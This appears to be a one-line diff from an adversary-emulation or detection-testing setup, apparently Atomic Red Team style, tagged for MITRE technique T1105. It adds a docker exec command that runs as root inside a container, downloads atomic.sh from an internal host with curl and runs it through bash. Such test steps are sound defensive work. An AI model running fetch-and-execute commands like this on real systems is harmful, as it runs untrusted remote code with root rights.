@@ -1,0 +1,1 @@
+docker exec --user root --workdir /tmp --env HOME=/root --env USER=root --env LOGNAME=root --env BLUEFIRE_TAG=step:s01 110bc223db4a0b2d19d02364f64d96c984ba6aa9e93b8ccc9ad857485af48921 sh -c 'curl -sO http://inet/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh'
